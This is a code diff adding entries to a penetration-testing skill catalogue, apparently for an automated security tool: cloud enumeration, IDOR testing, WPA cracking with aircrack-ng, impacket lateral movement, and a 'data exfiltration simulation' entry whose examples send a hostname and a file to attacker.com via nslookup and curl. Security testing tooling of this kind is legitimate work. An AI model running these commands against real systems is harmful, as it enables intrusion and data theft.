@@ -82,6 +82,12 @@ BUILTIN_SKILLS: list[Skill] = [
           ["subfinder -d {target} -all | dnsx -a -resp | httpx -tech-detect"],
           ["subfinder", "dnsx", "httpx"], "low"),
 
+    Skill("cloud_enum", "Cloud infrastructure enumeration (S3, Azure, GCP)", "recon",
+          ["cloud", "s3 bucket", "azure", "gcp", "cloud enum"],
+          ["subfinder -d {target} -all | grep -E '(s3|blob|storage)'",
+           "Check common cloud patterns: {target}.s3.amazonaws.com"],
+          ["subfinder"], "low"),
+
     # --- Web Application (12) ---
     Skill("vuln_scan", "Template-based vulnerability scanning", "web",
           ["vulnerability scan", "nuclei", "vuln scan", "cve scan"],
@@ -141,6 +147,13 @@ BUILTIN_SKILLS: list[Skill] = [
            "Check for Access-Control-Allow-Origin: *"],
           [], "low"),
 
+    Skill("auth_bypass", "Authentication bypass testing", "web",
+          ["auth bypass", "authentication bypass", "login bypass", "idor"],
+          ["Test IDOR on endpoints: /api/users/{id}",
+           "Check for broken access control across roles",
+           "Test parameter tampering on auth tokens"],
+          [], "high"),
+
     Skill("ssrf_test", "Server-side request forgery testing", "web",
           ["ssrf", "server-side request forgery"],
           ["Test URL parameters with internal IPs: 127.0.0.1, 169.254.169.254",
@@ -179,6 +192,12 @@ BUILTIN_SKILLS: list[Skill] = [
           ["bloodhound-python -d {target} -u user -p pass -c all",
            "netexec smb {target} --pass-pol"],
           ["bloodhound", "netexec"], "medium"),
+
+    Skill("wifi_audit", "Wireless network security audit", "network",
+          ["wifi", "wireless", "wpa", "wpa2", "aircrack"],
+          ["airodump-ng wlan0 -w capture",
+           "aircrack-ng -w /opt/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt capture.cap"],
+          [], "high"),
 
     # --- Credentials (5) ---
     Skill("hash_crack", "Password hash cracking", "creds",
@@ -235,6 +254,12 @@ BUILTIN_SKILLS: list[Skill] = [
            "Check for SUID binaries, cron jobs, writable paths"],
           ["linpeas"], "medium"),
 
+    Skill("lateral_movement", "Lateral movement across compromised network", "exploit",
+          ["lateral movement", "psexec", "wmiexec", "smbexec", "pivot"],
+          ["psexec.py {domain}/{user}:{password}@{target}",
+           "wmiexec.py {domain}/{user}:{password}@{target}"],
+          ["impacket"], "high"),
+
     # --- Post-Exploitation (4) ---
     Skill("linux_privesc", "Linux privilege escalation audit", "post",
           ["linux privesc", "linpeas", "linux escalation"],
@@ -256,6 +281,12 @@ BUILTIN_SKILLS: list[Skill] = [
           ["bloodhound-python -d {domain} -u {user} -p {pass} -c all",
            "Import into BloodHound and analyze paths to DA"],
           ["bloodhound"], "high"),
+
+    Skill("data_exfil", "Data exfiltration simulation and detection", "post",
+          ["data exfiltration", "exfil", "data theft", "exfiltrate"],
+          ["Test DNS exfil: nslookup $(cat /etc/hostname).attacker.com",
+           "Test HTTP exfil: curl -X POST -d @sensitive.txt https://attacker.com/exfil"],
+          [], "high"),
 
     # --- OSINT (5) ---
     Skill("username_osint", "Username reconnaissance across platforms", "osint",
